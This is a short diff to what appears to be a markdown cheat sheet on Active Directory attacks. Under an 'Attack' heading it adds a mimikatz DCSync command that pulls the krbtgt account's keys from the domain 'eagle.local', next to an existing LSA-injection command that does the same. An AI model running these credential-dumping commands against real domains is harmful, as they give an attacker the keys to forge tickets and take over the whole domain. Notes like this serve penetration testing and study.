@@ -360,7 +360,10 @@ Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofother
 ### Attack
 ```shell
 # get krbtgt keys
+## from DC memory (LSA) 
 ./mimikatz "lsadump::lsa /inject /name:krbtgt"
+## using dcsync 
+./mimikatz "lsadump::dcsync /domain:eagle.local /user:krbtgt"
 
 # Rubeus
 ## get info about user
